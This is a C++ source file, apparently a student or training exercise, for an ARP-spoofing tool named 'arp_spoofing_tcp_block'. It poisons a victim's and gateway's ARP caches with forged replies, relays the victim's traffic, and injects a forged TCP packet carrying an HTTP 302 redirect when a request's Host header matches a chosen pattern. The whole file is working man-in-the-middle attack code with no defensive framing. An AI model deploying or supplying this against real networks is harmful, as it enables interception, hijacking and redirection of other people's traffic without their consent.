#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <libnet.h>
#include <time.h>
#include <pthread.h>

//MAC주소 길이
#define MAC_ALEN 6
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]
#define MESSAGE_SIZE 100
#define CARRY 65536
#define TRUE 1
#define FALSE 0

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct Address {
    Mac MAC_TARGET;
    Mac MAC_SOURCE;
    Mac MAC_ADD; //my MAC
    Ip IP_ADD; //my IP
};

struct Pseudoheader{
    uint32_t srcIP;
    uint32_t destIP;
    uint8_t reserved=0;
    uint8_t protocol;
    uint16_t TCPLen;
};

struct tcp_data{
    char msg[MESSAGE_SIZE];
    int msg_size = MESSAGE_SIZE;
};

struct EthPacket{
    EthHdr eth_;
    libnet_ipv4_hdr ip_v4_;
    libnet_tcp_hdr tcp_;
    tcp_data data;
};
#pragma pack(pop)

void usage() {
    printf("syntax: arp_spoofing_tcp_block <interface> <sender ip> <target ip> <pattern>\n");
    printf("sample: arp_spoofing_tcp_block wlan0 192.168.10.2 192.168.10.1 test.gilgil.net\n");
}

//for test
void dump(unsigned char* buf, int size) {
    int i;
    for (i = 0; i < size; i++) {
        if (i != 0 && i % 16 == 0)
            printf("\n");
        printf("%02X ", buf[i]);
    }
    printf("\n");
}

uint16_t calculate(uint16_t* data, int dataLen)
{
    uint16_t result;
    int tempChecksum=0;
    int length;
    bool flag=false;
    if((dataLen%2)==0)
        length=dataLen/2;
    else
    {
        length=(dataLen/2)+1;
        flag=true;
    }

    for (int i = 0; i < length; ++i) // cal 2byte unit
    {


        if(i==length-1&&flag) //last num is odd num
            tempChecksum+=ntohs(data[i]&0x00ff);
        else
            tempChecksum+=ntohs(data[i]);

        if(tempChecksum>CARRY)
                tempChecksum=(tempChecksum-CARRY)+1;

    }

    result=tempChecksum;
    return result;
}

uint16_t calIPChecksum(uint8_t* data)
{
    struct iphdr* iph=(struct iphdr*)data;
    iph->check=0;//set Checksum field 0

    uint16_t checksum=calculate((uint16_t*)iph,iph->ihl*4);
    iph->check=htons(checksum^0xffff);//xor checksum

    return iph->check;
}

uint16_t calTCPChecksum(uint8_t *data,int dataLen) //data는 ip헤더 시작위치, datalen은 ip헤더 부터 끝까지 길이
{
    //make Pseudo Header
    struct Pseudoheader pseudoheader; //saved by network byte order

    //init Pseudoheader
    struct iphdr *iph=(struct iphdr*)data;
    struct tcphdr *tcph=(struct tcphdr*)(data+iph->ihl*4);

    //Pseudoheader initialize
    memcpy(&pseudoheader.srcIP,&iph->saddr,sizeof(pseudoheader.srcIP));
    memcpy(&pseudoheader.destIP,&iph->daddr,sizeof(pseudoheader.destIP));
    pseudoheader.protocol=iph->protocol;
    pseudoheader.TCPLen=htons(dataLen-(iph->ihl*4));

    //Cal pseudoChecksum
    uint16_t pseudoResult=calculate((uint16_t*)&pseudoheader,sizeof(pseudoheader));

    //Cal TCP Segement Checksum
    tcph->check=0; //set Checksum field 0
    uint16_t tcpHeaderResult=calculate((uint16_t*)tcph,ntohs(pseudoheader.TCPLen));


    uint16_t checksum;
    int tempCheck;

    if((tempCheck=pseudoResult+tcpHeaderResult)>CARRY)
        checksum=(tempCheck-CARRY) +1;
    else
        checksum=tempCheck;


    checksum=ntohs(checksum^0xffff); //xor checksum
    tcph->check=checksum;

    return tcph->check;
}

//find warning site
int warning(const u_char* buf, char* site) {
    const u_char* packet = buf;

    libnet_ipv4_hdr *ip_hdr_v4 = (libnet_ipv4_hdr*)(packet);
    libnet_tcp_hdr *tcp_hdr = (libnet_tcp_hdr *)(packet + (ip_hdr_v4->ip_hl*4));
    int data_size = ntohs(ip_hdr_v4->ip_len) - ip_hdr_v4->ip_hl*4 - tcp_hdr->th_off*4;

    //printf("[is it warning?] data size : %d ip_hdr_v4 : %d \n", data_size, ip_hdr_v4->ip_hl*4);

    if(data_size != 0){
        packet = packet + tcp_hdr->th_off*4 + ip_hdr_v4->ip_hl*4;

        if (packet[0] == 'G'){ //POST? "GET "로 필터링하기
            /*
            printf("\n==========http request ===========\n");
            printf("\n");
            for (i = 0; i < data_size; i++) {
                if (i != 0 && i % 16 == 0)
                    printf("\n");
                printf("%02X ", packet[i]);
            }
            printf("\n");
            */
            char* ptr = strstr((char*)packet, "Host: "); //strstr,, Host: 없으면 \0 나올때까지 계속감 -> strnstr
            if (ptr !=NULL){
                ptr = ptr + strlen("Host: ");
                ptr = strtok(ptr, "\r\n"); //strtok도 마찬가지 없으면 \0 나올때까지 계속감 ~ 수동으로 찾기
                printf("\nHOST_BY_JUN : %s\n", ptr);
                printf("warning site : %s\n", site);

                if(strncmp(ptr, site, strlen(site)) == 0){
                    printf("find it %s\n", ptr);
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

//get my IP/MAC address
int GetInterfaceMacAddress(const char *ifname, Mac *mac_addr, Ip* ip_addr){
    struct ifreq ifr;
    int sockfd, ret;

    printf("Get interface(%s) MAC address\n", ifname);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        printf("Fail to get\n");
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    memcpy((void*)mac_addr, ifr.ifr_hwaddr.sa_data, Mac::SIZE);

    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    char ipstr[40];
    //memcpy((void*)ip_addr, ifr.ifr_addr.sa_data, Ip::SIZE);
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
    *ip_addr = Ip(ipstr);

    printf("sucess get interface(%s) MAC/IP\n",ifname);
    close(sockfd);
    return 0;
}
void SendPacket(pcap_t* handle, const u_char* packet, int packet_size){
    //printf("================== sending packet ==================\n");
    //dump((u_char*)packet, packet_size);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), packet_size);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

//get MAC using IP
void SendArpReq(pcap_t* handle, Mac MAC_ADD, Ip IP_ADD, Ip ip){
    EthArpPacket packet;
    //To get MAC address - arp request to victim
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(MAC_ADD); //my mac eth_packet
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(MAC_ADD); //my MAC_ADD arp_packet
    packet.arp_.sip_ = htonl(IP_ADD); //my ip - ??!any ip in here can get reply packet
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //I want to know victim MAC
    packet.arp_.tip_ = htonl(ip);  //ip want to get MAC

    printf("Sending ArpRequest to get Source MAC..\n");
    //ARP request packet to victim
    SendPacket(handle, (u_char*)&packet, sizeof(EthArpPacket));
}

//Get arp reply for get MAC
EthArpPacket GetArpReply(pcap_t* pcap, Mac* MAC_ADD,Mac* MAC_SOURCE, Mac* MAC_GATEWAY, Ip s_ip, Ip t_ip){
    EthArpPacket packet;
    int check[2] = {0,};

    while (true) {
            if (check[0] && check[1]){
                break;
            }

            struct pcap_pkthdr* header;
            libnet_ethernet_hdr *eth_hdr;

            const u_char* out_packet;

            int res = pcap_next_ex(pcap, &header, &out_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            //hdr
            eth_hdr = (libnet_ethernet_hdr*)(out_packet);

            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP){
                continue;
            }

            EthArpPacket *arp_packet = (EthArpPacket *)out_packet;

            //get arp request from sender
            if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == s_ip){
                printf("Source Mac Address Captured success\n");
                packet.arp_.tmac_ = arp_packet->arp_.smac();
                packet.eth_.dmac_ = arp_packet->arp_.smac();
                *MAC_SOURCE = arp_packet->arp_.smac();
                check[0] = 1;
                continue;
            }

            //get arp request from target
            if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == t_ip){
                printf("Target Mac Address Captured success\n");
                *MAC_GATEWAY = arp_packet->arp_.smac();
                check[1] = 1;
                continue;
            }
    }

    //Successed get S/T MAC!! let's make attack packet
    //destination mac is defined (victim mac)
    packet.eth_.smac_ = Mac(*MAC_ADD); //fake my mac to gateway mac
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(*MAC_ADD); //fake my mac to gateway mac
    packet.arp_.sip_ = htonl(t_ip); //target ip
    //target mac is defined
    packet.arp_.tip_ = htonl(s_ip);  //source ip

    printf("success making arp attack packet\n");
    return packet;
}

void RelayPacket(pcap_t* handle, pcap_pkthdr* header, EthArpPacket* eth_hdr, Mac* MAC_ADD, Mac* MAC_GATEWAY, Mac* MAC_SOURCE){
    if (ntohs(eth_hdr->eth_.type_) == ETHERTYPE_IP && eth_hdr->eth_.smac() == *MAC_SOURCE){
        eth_hdr->eth_.dmac_ = Mac(*MAC_GATEWAY);
        eth_hdr->eth_.smac_ = Mac(*MAC_ADD);

        //printf("relay to target... ether type : 0x%04X\n", ntohs(eth_hdr->eth_.type_));

        //relay to target
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(eth_hdr), header->len);

        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
    else{
        return;
    }
}

void backward_fin(Mac MAC_ADD, Mac MAC_TARGET, pcap_t* handle, const u_char* buf, EthArpPacket* attack_packet){
    libnet_ethernet_hdr *eth_hdr = (libnet_ethernet_hdr*)buf;
    libnet_ipv4_hdr *ip_hdr_v4 = (libnet_ipv4_hdr*)(buf + sizeof(libnet_ethernet_hdr));
    libnet_tcp_hdr *tcp_hdr = (libnet_tcp_hdr*)(buf + sizeof(libnet_ethernet_hdr) + (ip_hdr_v4->ip_hl*4));

    int packet_size = sizeof(libnet_ethernet_hdr) + ntohs(ip_hdr_v4->ip_len);

    printf("================== send redirect packet ==================\n");
    printf("================== origin packet ==================\n");

    printf("packet size : %d", packet_size);
    dump((u_char*)buf, packet_size);

    EthPacket* packet = (EthPacket*)malloc(sizeof(EthPacket));
    memcpy(packet, buf, sizeof(EthPacket));

    std::string message = "HTTP/1.0 302 Redirect\r\nLocation: http://facebook.com\r\n\r\n";
    //std::string message = "hihi\r\n";

    //set ether header
    packet->eth_.dmac_ = Mac(eth_hdr->ether_shost);//d_mac is org-packet
    packet->eth_.smac_ = Mac(MAC_ADD);
    packet->eth_.type_ = eth_hdr->ether_type;

    //set ip header
    packet->ip_v4_.ip_len = htons(sizeof(libnet_ipv4_hdr) + sizeof(libnet_tcp_hdr) + message.size()); //Here is RST block total length
    packet->ip_v4_.ip_dst = ip_hdr_v4->ip_src; //d_ip is org-packet reverse
    packet->ip_v4_.ip_src = ip_hdr_v4->ip_dst; //s_ip is org-packet reverse
    packet->ip_v4_.ip_ttl = 128; //ttl is about 128

    int tcp_data_size = ntohs(ip_hdr_v4->ip_len) - ip_hdr_v4->ip_hl*4 - tcp_hdr->th_off*4;

    //set tcp header
    packet->tcp_.th_dport = tcp_hdr->th_sport;//sport, dport is org-packet
    packet->tcp_.th_sport = tcp_hdr->th_dport;//sport, dport is org-packet
    packet->tcp_.th_seq = tcp_hdr->th_ack;
    packet->tcp_.th_ack = htonl(ntohl(tcp_hdr->th_seq) + tcp_data_size);
    packet->tcp_.th_off = sizeof(libnet_tcp_hdr)/4;
    packet->tcp_.th_flags = TH_FIN | TH_ACK | TH_PUSH; //Fin block

    //set tcp data
    memcpy(packet->data.msg, message.c_str(), message.size());
    packet->data.msg_size = message.size();

    packet->ip_v4_.ip_sum = calIPChecksum((u_int8_t*)&packet->ip_v4_);
    packet->tcp_.th_sum = calTCPChecksum((u_int8_t*)&packet->ip_v4_, ntohs(packet->ip_v4_.ip_len));

    printf("================== made packet ==================\n");
    packet_size = sizeof(libnet_ethernet_hdr) + htons(packet->ip_v4_.ip_len);
    dump((u_char*)packet, packet_size);

    //send ARP recover packet
    EthArpPacket Recover_packet = *attack_packet;
    Recover_packet.arp_.smac_ = Mac(MAC_TARGET);
    SendPacket(handle, (const u_char*)&Recover_packet, sizeof(EthArpPacket));
    //send redirect packet
    SendPacket(handle, (const u_char*)packet, packet_size);
    free(packet);

    //redirect complete
    exit(1);
}


void ArpSpoofing(pcap_t* pcap, pcap_t* handle, Ip my_ip, Ip s_ip, Ip t_ip, Mac* MAC_ADD, Mac* MAC_SOURCE, Mac* MAC_GATEWAY, char* pattern){
    //time to send regularpacket
    time_t time1 = time(NULL);

    //Send ARP request to get sender MAC ADD
    SendArpReq(handle, *MAC_ADD, my_ip, s_ip);

    //Send ARP request to get target MAC ADD
    SendArpReq(handle, *MAC_ADD, my_ip, t_ip);


    //waiting for ARP reply packet... to get sender/target MAC & make attack_packet
    EthArpPacket attack_packet = GetArpReply(pcap, MAC_ADD, MAC_SOURCE, MAC_GATEWAY, s_ip, t_ip);

    printf("Arp spoofing start...\n");
    //init attack
    SendPacket(handle, (u_char*)&attack_packet, sizeof(EthArpPacket));

    //relay to gateway
    //if not ARP packet, than relay to gateway all
    //waiting for ARP reply packet from victim... to get vicitm MAC
    while (true) {

            time_t time2 = time(NULL);
            if (time2 - time1 >= 1){
                //attack packet to victim again
                //printf("regularly attack.. time gap : %02ld\n", time2-time1);
                SendPacket(handle, (u_char*)&attack_packet, sizeof(EthArpPacket));
                time1 = time2;
            }

            struct pcap_pkthdr* header;
            libnet_ethernet_hdr *eth_hdr;

            const u_char* out_packet;

            int res = pcap_next_ex(pcap, &header, &out_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }

            //hdr
            eth_hdr = (libnet_ethernet_hdr*)(out_packet);
            libnet_ipv4_hdr *ip_hdr_v4 = (libnet_ipv4_hdr*)(out_packet + sizeof(libnet_ethernet_hdr));

            //if get ARP packet from ???? than we attack again
            if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
                EthArpPacket *arp_packet = (EthArpPacket *)out_packet;
                if(arp_packet->arp_.sip() == s_ip && arp_packet->arp_.tip() == t_ip){
                    //attack packet again
                    printf("s->t arp detected relay to target... ether type : 0x%04X\n", ntohs(eth_hdr->ether_type));
                    SendPacket(handle, (u_char*)&attack_packet, sizeof(EthArpPacket));
                }
                if(arp_packet->arp_.sip() == t_ip && arp_packet->arp_.tip() == my_ip){
                    //attack packet again
                    printf("t->s arp detected relay to target... ether type : 0x%04X\n", ntohs(eth_hdr->ether_type));
                    SendPacket(handle, (u_char*)&attack_packet, sizeof(EthArpPacket));
                }
            }

            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP){
                //printf("PASS! type : %X\n", ntohs(eth_hdr->ether_type));
                continue;
            }
            if(ip_hdr_v4->ip_p != IPPROTO_TCP){
                //printf("PASS! protocol : %X\n", ip_hdr_v4->ip_p);
                continue;
            }

            //printf("%u bytes captured\n", header->caplen);

            //is it warning?? check == 1 -> True check == 0 -> False
            if(warning(out_packet + sizeof(libnet_ethernet_hdr), pattern)){
                backward_fin(*MAC_ADD, *MAC_GATEWAY, pcap, (u_char*)out_packet, &attack_packet);
            }
            //relay sender to target
            RelayPacket(handle, header, (EthArpPacket *)eth_hdr, MAC_ADD, MAC_GATEWAY, MAC_SOURCE);
    }
}

void thread_task(const char *dev, Ip s_ip, Ip t_ip, Ip my_ip, Mac MAC_ADD, char* pattern){
    //pcap for getpacket
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return;
    }

    //pcap for sendpacket
    char errbuf_2[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf_2);
        return;
    }

    Mac MAC_SOURCE;
    Mac MAC_TARGET;

    //attack packet
    ArpSpoofing(pcap, handle, my_ip, s_ip, t_ip, &MAC_ADD, &MAC_SOURCE, &MAC_TARGET, pattern);

    pcap_close(pcap);
    pcap_close(handle);
}

int main(int argc, char* argv[]) {
    if (argc < 5) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char* pattern = argv[4];

    Mac MAC_ADD;
    Ip IP_ADD;

    //MAC_ADD , IP_ADD is my mac & ip
    GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);

    if (int inter = argc-4 >= 0){
        //have to make multi-thread
        printf("have to make multi-thread...\n");

        for (int i=0; i<inter; i+=2){
            //start arp-spoofing for sender-target set
            Ip s_ip(argv[i+2]);
            Ip t_ip(argv[i+3]);

            //have to add thread
            thread_task(dev, s_ip,t_ip,IP_ADD,MAC_ADD,pattern);
        }
    }




}
